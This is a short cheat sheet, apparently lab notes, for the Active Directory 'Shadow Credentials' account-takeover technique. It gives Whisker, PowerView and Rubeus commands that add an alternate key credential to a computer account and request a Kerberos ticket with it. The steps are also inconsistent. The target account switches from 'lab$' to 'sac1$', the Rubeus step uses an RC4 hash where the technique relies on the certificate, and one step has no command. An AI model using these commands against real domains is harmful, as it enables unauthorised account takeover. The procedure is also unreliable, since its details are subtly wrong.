**Shadow Credentials in AD**

Take over an AD user or computer account by modifying the target object's `msDS-KeyCredentialLink` attribute and appending it with alternate credentials in the form of certificates. For more details, refer to this [article](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials).

**Requirements:**

- Ability to write to the `msDS-KeyCredentialLink` attribute on a target user or computer.
- Example: In this lab, everyone is allowed to WRITE to the `lab$` computer account.

**Steps to Add Shadow Credentials:**

1. **Add Shadow Credentials:**

   Use `Whisker.exe` to add shadow credentials by modifying the `msDS-KeyCredentialLink` attribute on the computer account.

   ```plaintext
   Whisker.exe add /target:sac1$
   ```

2. **Confirm Credentials Added:**

   Verify that the credentials have been added to the computer account.

   ```plaintext
   get-netcomputer sac1
   ```

3. **Use TGT (Ticket-Granting Ticket):**

   Use the TGT as required for further operations.

4. **Additional Command with Powerview:**

   Confirm the addition of shadow credentials using PowerView.

   ```powershell
   Get-DomainComputer -Identity sac1 | Select-Object -ExpandProperty 'msDS-KeyCredentialLink'
   ```

5. **Additional Command with Rubeus:**

   Use Rubeus to request a TGT for the shadow credentials.

   ```plaintext
   Rubeus.exe asktgt /user:sac1$ /rc4:<NTLM_HASH> /domain:<DOMAIN> /dc:<DC_IP>
   ```

